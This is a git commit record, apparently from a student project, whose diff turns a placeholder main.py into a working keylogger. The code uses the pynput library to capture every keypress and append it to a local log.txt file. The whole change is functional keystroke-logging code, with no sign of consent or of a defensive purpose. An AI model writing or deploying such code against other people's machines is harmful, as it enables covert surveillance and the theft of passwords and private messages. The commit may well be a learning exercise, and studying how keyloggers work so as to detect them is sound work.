f17853f6582a33a8295fd2f133664d4a22e406c9
HubertPogonowski <u56649@student.wat.edu.pl>
2025-08-20 14:45:36 +0200

    second commit

--- main.py
+++ main.py
@@ -1,1 +1,23 @@
-print("KeyLogger")
+from pynput import keyboard
+
+def on_press(key):
+    logFile = open("log.txt", "a")
+    char = str(key)
+    char = char.replace("'", "")
+
+    if char == "Key.space":
+        char = " "
+    elif char == "Key.enter":
+        char = "\n"
+    elif char == "Key.shift":
+        char = ' '
+    elif char == "Key.ctrl":
+        char = " "      
+
+    logFile.write(char)
+    
+        
+
+
+with keyboard.Listener(on_press=on_press) as l:
+    l.join()
